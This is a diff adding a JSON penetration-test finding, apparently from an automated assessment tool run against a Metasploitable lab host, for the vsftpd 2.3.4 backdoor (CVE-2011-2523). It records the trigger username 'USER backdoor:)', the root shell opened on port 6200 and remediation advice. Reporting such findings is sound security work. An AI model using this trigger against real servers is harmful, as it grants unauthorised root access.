@@ -1,0 +1,30 @@
+{
+  "finding_id": "finding_002",
+  "title": "vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)",
+  "severity": "critical",
+  "description": "The vsftpd 2.3.4 FTP server contains a backdoor that opens a root shell on TCP port 6200 when a username containing ':)' is sent during authentication. This was a supply-chain compromise of the vsftpd source code. Exploitation provides immediate uid=0(root) access.",
+  "affected_hosts": [
+    "192.168.0.140"
+  ],
+  "evidence": "Triggered backdoor by sending 'USER backdoor:)' to FTP port 21, then connected to port 6200:\\n\\n220 (vsFTPd 2.3.4)\\n331 Please specify the password.\\n\\nBackdoor shell on port 6200:\\nuid=0(root) gid=0(root)\\nroot\\nmetasploitable\\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux",
+  "cvss_score": 10.0,
+  "remediation": "Upgrade vsftpd to a version later than 2.3.4 obtained from a trusted source. Verify package integrity with checksums.",
+  "references": [
+    "CVE-2011-2523",
+    "https://www.exploit-db.com/exploits/17491"
+  ],
+  "exploitable": true,
+  "exploitation_status": "CONFIRMED",
+  "discovered_at": "2026-03-01T18:01:11.919704",
+  "assessment_id": "test4",
+  "evidence_validation": {
+    "quality": "acceptable",
+    "score": 25,
+    "issues": [],
+    "suggestions": [
+      "For RCE: Show command output (whoami, id, hostname)",
+      "Include reverse shell session or command injection output"
+    ],
+    "has_exploitation_proof": true
+  }
+}
